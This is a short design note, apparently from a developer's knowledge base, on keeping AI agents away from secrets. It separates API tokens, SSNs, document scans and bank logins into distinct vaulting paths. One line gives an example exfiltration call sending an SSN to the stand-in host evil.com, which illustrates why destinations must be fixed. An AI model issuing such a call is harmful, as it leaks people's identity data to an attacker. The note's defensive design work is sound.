---
id: perm-20260910-identity-fields-are-not-documents
title: "Identity fields and document blobs are different portals"
type: permanent
status: active
created: 2026-09-10
updated: 2026-09-10
harnesses: [hermes, omp]
domains: [cs, tool-use, frameworks]
confidence: high
tags: [permanent, pii, documents]
---

# Identity fields and document blobs are different portals

## Idea (atomic)

Three destinations, three products. Collapsing them into one AI vault is how you get `get_secret` again.

| Material | Executor | Agent sees |
|---|---|---|
| GitHub/AWS token | HTTP wrap (Infisical/HASP) or handle+no-env | placeholder |
| SSN / tax id / passport **number** | Origin-bound field fill (Hermes vault kind) or Skyflow/VGS outbound | `tok_…` / `{filled, origin}` |
| Statements / passport **scan** PDF | File token on an allowlisted HTTP connection, or a human | `{uploaded: true}` — never bytes |
| Bank **login** | Plaid-class; not Playwright + password | aggregator token |

If the agent picks the URL, `submit_private_field(ssn, evil.com)` is `read_secret` with extra steps. Destination bind must be frozen.

## Why it matters for our harnesses

Hermes follow-ups: (1) vault identity kind in-tree, same machinery as payment; (2) documents explicitly not a vault kind. Do not mix with #12324 (Plaid) or #102922 (provider-egress NER). OMP: obfuscation is the prompt filter for tokens, not PII files.

## Related

- [[literature/lit-20260910-agent-http-inject-brokers]]
- [[literature/lit-20260910-pii-tokenization-vaults]]
- [[permanent/perm-20260910-screenshots-bypass-vault-redaction]]
